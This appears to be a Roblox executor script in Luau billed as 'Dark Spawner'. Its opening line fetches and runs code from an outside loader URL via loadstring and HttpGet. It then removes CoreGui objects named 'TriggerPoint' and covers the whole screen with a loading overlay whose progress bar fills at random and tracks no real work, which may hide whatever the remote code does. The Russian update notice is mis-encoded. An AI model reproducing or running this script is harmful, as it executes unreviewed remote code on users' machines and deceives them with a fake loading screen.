ID="0b6a5fe7-f713-49bc-ad3b-16af8836eaec";
loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local CoreGui = game:GetService("CoreGui")

-- Kill it if it already exists
local trigger = CoreGui:FindFirstChild("TriggerPoint", true)
if trigger then
    trigger:Destroy()
end

-- Kill it instantly whenever it's added
CoreGui.DescendantAdded:Connect(function(obj)
    if obj.Name == "TriggerPoint" then
        obj:Destroy()
    end
end)

-- Function to create the loading screen
local function createLoadingScreen()
    -- Create ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LoadingScreen"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.DisplayOrder = 999999999
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = playerGui

    -- Main Frame (Full Screen Background)
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.Position = UDim2.new(0, 0, 0, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    mainFrame.BorderSizePixel = 0
    mainFrame.ZIndex = 999999999
    mainFrame.Parent = screenGui

    -- Loading Container Frame
    local loadingFrame = Instance.new("Frame")
    loadingFrame.Name = "LoadingFrame"
    loadingFrame.Size = UDim2.new(0, 450, 0, 150)
    loadingFrame.Position = UDim2.new(0.5, -225, 0.5, -75)
    loadingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    loadingFrame.BorderSizePixel = 0
    loadingFrame.Parent = mainFrame

    -- Add corner rounding
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = loadingFrame

    -- Update Info Text
    local updateText = Instance.new("TextLabel")
    updateText.Name = "UpdateText"
    updateText.Size = UDim2.new(1, -40, 0, 25)
    updateText.Position = UDim2.new(0, 20, 0, 15)
    updateText.BackgroundTransparency = 1
    updateText.Text = "üü¢–°–∫—Ä–∏–ø—Ç –±—ã–ª –æ–±–Ω–æ–≤–ª–µ–Ω 20 –∞–≤–≥—É—Å—Ç–∞üü¢"
    updateText.TextColor3 = Color3.fromRGB(100, 255, 100)
    updateText.TextScaled = true
    updateText.Font = Enum.Font.GothamBold
    updateText.Parent = loadingFrame

    -- Loading Text
    local loadingText = Instance.new("TextLabel")
    loadingText.Name = "LoadingText"
    loadingText.Size = UDim2.new(1, -40, 0, 30)
    loadingText.Position = UDim2.new(0, 20, 0, 45)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = "Loading Dark Spawner"
    loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
    loadingText.TextScaled = true
    loadingText.Font = Enum.Font.GothamMedium
    loadingText.Parent = loadingFrame

    -- Progress Text (Percentage)
    local progressText = Instance.new("TextLabel")
    progressText.Name = "ProgressText"
    progressText.Size = UDim2.new(0, 60, 0, 25)
    progressText.Position = UDim2.new(1, -80, 0, 47)
    progressText.BackgroundTransparency = 1
    progressText.Text = "0%"
    progressText.TextColor3 = Color3.fromRGB(200, 200, 200)
    progressText.TextScaled = true
    progressText.Font = Enum.Font.Gotham
    progressText.Parent = loadingFrame

    -- Progress Bar Background
    local progressBg = Instance.new("Frame")
    progressBg.Name = "ProgressBackground"
    progressBg.Size = UDim2.new(1, -40, 0, 8)
    progressBg.Position = UDim2.new(0, 20, 0, 85)
    progressBg.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    progressBg.BorderSizePixel = 0
    progressBg.Parent = loadingFrame

    local progressBgCorner = Instance.new("UICorner")
    progressBgCorner.CornerRadius = UDim.new(0, 4)
    progressBgCorner.Parent = progressBg

    -- Progress Bar Fill
    local progressFill = Instance.new("Frame")
    progressFill.Name = "ProgressFill"
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.Position = UDim2.new(0, 0, 0, 0)
    progressFill.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
    progressFill.BorderSizePixel = 0
    progressFill.Parent = progressBg

    local progressFillCorner = Instance.new("UICorner")
    progressFillCorner.CornerRadius = UDim.new(0, 4)
    progressFillCorner.Parent = progressFill

    -- Variables for loading animation
    local currentProgress = 0
    local targetProgress = 0
    local isRunning = true

    -- Function to update progress
    local function updateProgress()
        if currentProgress < 100 and isRunning then
            if currentProgress < 70 then
                -- Fast progress until 70%
                targetProgress = math.min(currentProgress + math.random(5, 15), 70)
            elseif currentProgress < 95 then
                -- Medium progress from 70% to 95%
                targetProgress = math.min(currentProgress + math.random(3, 8), 95)
            else
                -- Slow progress from 95% to 100%
                targetProgress = math.min(currentProgress + math.random(1, 2), 100)
            end
        end
        
        if not progressFill or not progressFill.Parent then
            return
        end
        
        -- Animate to target progress
        local tweenInfo = TweenInfo.new(
            0.5,
            Enum.EasingStyle.Quad,
            Enum.EasingDirection.Out
        )
        
        local progressTween = TweenService:Create(
            progressFill,
            tweenInfo,
            {Size = UDim2.new(targetProgress / 100, 0, 1, 0)}
        )
        
        progressTween:Play()
        
        -- Update percentage text
        if progressText and progressText.Parent then
            progressText.Text = math.floor(targetProgress) .. "%"
        end
        currentProgress = targetProgress
        
        -- Check if loading is complete
        if currentProgress >= 100 then
            isRunning = false
            
            -- Wait a moment then fade out
            wait(1.5)
            
            if screenGui and screenGui.Parent then
                local fadeInfo = TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
                local fadeTween = TweenService:Create(mainFrame, fadeInfo, {BackgroundTransparency = 1})
                
                -- Also fade all text elements
                for _, child in ipairs(loadingFrame:GetChildren()) do
                    if child:IsA("TextLabel") then
                        TweenService:Create(child, fadeInfo, {TextTransparency = 1}):Play()
                    end
                end
                
                TweenService:Create(loadingFrame, fadeInfo, {BackgroundTransparency = 1}):Play()
                TweenService:Create(progressBg, fadeInfo, {BackgroundTransparency = 1}):Play()
                TweenService:Create(progressFill, fadeInfo, {BackgroundTransparency = 1}):Play()
                
                fadeTween:Play()
                fadeTween.Completed:Connect(function()
                    if screenGui and screenGui.Parent then
                        screenGui:Destroy()
                    end
                end)
            end
        end
    end

    -- Loading dots animation
    local dotsCoroutine = coroutine.create(function()
        local dots = ""
        local dotCount = 0
        while isRunning and screenGui.Parent and loadingText and loadingText.Parent do
            dotCount = (dotCount + 1) % 4
            dots = string.rep(".", dotCount)
            if loadingText and loadingText.Parent then
                loadingText.Text = "Loading Dark Spawner" .. dots
            end
            wait(0.5)
        end
    end)
    
    coroutine.resume(dotsCoroutine)

    -- Progress animation loop
    local progressCoroutine = coroutine.create(function()
        wait(1) -- Initial delay
        
        while currentProgress < 100 and isRunning and screenGui.Parent do
            updateProgress()
            wait(math.random(1, 2)) -- Random delay between updates
        end
    end)
    
    coroutine.resume(progressCoroutine)

    -- Cleanup function
    screenGui.AncestryChanged:Connect(function()
        if not screenGui.Parent then
            isRunning = false
        end
    end)

    return screenGui
end

-- Run the loading screen
createLoadingScreen()
